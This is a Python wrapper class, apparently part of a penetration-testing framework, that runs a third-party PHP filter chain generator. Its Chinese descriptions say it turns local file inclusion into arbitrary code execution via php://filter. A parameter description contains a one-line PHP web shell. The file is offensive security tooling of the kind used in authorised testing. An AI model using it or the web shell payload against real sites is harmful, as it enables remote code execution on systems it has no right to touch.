# tools/php_filter_chain_tool.py
# PHP Filter Chain Generator
import os
import sys
import json
from typing import Dict, Any
from tool_framework import CommandLineTool


class PHPFilterChainTool(CommandLineTool):
    """
    PHP Filter Chain Generator 封装
    利用 PHP filter 协议生成任意代码执行的过滤链
    """

    def __init__(self):
        cmd = "python3" if os.path.exists("/.dockerenv") else sys.executable
        super().__init__(cmd)

        # Dockerfile 克隆路径
        docker_path = "/app/thirdparty/php_filter_chain/php_filter_chain.py"
        local_path = os.path.join(os.getcwd(), "thirdparty", "php_filter_chain", "php_filter_chain.py")
        self.script_path = docker_path if os.path.exists(docker_path) else local_path
        self.timeout = 60

    def name(self) -> str:
        return "php-filter-chain"

    def description(self) -> str:
        return "PHP Filter 链生成器，利用 php://filter 协议实现任意代码执行"

    def supported_vulns(self) -> list:
        return ["LFI", "File Inclusion", "RCE", "PHP Filter Bypass"]

    def check_available(self) -> bool:
        return os.path.exists(self.script_path)

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "code": {
                "type": "str",
                "description": "要执行的 PHP 代码，如 '<?php system($_GET[\"c\"]);?>'",
                "required": True
            },
            "chain": {
                "type": "bool",
                "description": "是否输出完整的 filter 链",
                "required": False,
                "default": True
            }
        }

    def execute(self, target: str, params: Dict) -> Dict:
        code = params.get("code")
        if not code:
            raise ValueError("必须提供 code 参数")

        cmd = [self.cmd_path, self.script_path, "--chain", code]

        try:
            raw_result = self._run_command(cmd, timeout=self.timeout, stream_output=True)
            stdout = raw_result.get("stdout", "")
            stderr = raw_result.get("stderr", "")

            # 提取生成的 filter 链
            filter_chain = stdout.strip() if stdout else ""

            # 检查是否成功生成
            success = "php://filter" in filter_chain or "convert" in filter_chain

            result = {
                "success": success,
                "vulnerable": success,
                "code": code,
                "filter_chain": filter_chain[:5000] if filter_chain else "",
                "chain_length": len(filter_chain),
                "summary": f"PHP Filter 链生成{'成功' if success else '失败'}"
            }

            result["stdout"] = stdout
            result["stderr"] = stderr
            return result

        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "vulnerable": False,
                "summary": f"执行失败: {str(e)}"
            }